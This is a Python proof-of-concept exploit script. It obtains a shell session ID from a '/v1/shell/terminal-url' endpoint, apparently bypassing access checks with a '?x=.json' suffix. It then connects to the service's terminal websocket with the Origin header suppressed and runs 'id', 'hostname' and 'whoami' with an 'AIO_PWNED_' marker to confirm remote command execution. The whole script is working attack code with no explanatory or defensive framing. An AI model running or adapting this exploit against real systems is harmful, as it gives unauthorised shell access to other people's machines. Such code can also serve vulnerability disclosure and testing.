#!/usr/bin/env python3
import json, re, sys, urllib.request, websocket, datetime, time
B = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18080"
WS = B.replace("https://", "wss://", 1).replace("http://", "ws://", 1)
r=json.load(urllib.request.urlopen(B+"/v1/shell/terminal-url?x=.json"))
sid=re.search(r"session_id=([0-9a-f-]+)", r["data"]).group(1)
print(f"[{datetime.datetime.now(datetime.timezone.utc).isoformat()}] session_id={sid}")
ws=websocket.create_connection(f"{WS}/v1/shell/ws?session_id={sid}&x=.json", suppress_origin=True, timeout=15)
print("[+] websocket connected")
# drain restore frames
t0=time.time()
while time.time()-t0 < 2:
    try: ws.recv()
    except Exception: break
ws.send(json.dumps({"type":"resize","data":{"cols":120,"rows":40}}))
ws.send(json.dumps({"type":"input","data":"id; hostname; whoami; echo AIO_PWNED_$(id -u)_$(hostname)\n"}))
out=""; t0=time.time()
while time.time()-t0 < 12:
    try:
        m=ws.recv()
        out += m if isinstance(m,str) else m.decode('utf-8','replace')
        if "AIO_PWNED_" in out and out.count("AIO_PWNED_")>=2: break
    except Exception as e:
        out += f"\n[recv-stop {e}]"; break
ws.close()
print("---- RAW ----"); print(out[-4000:])
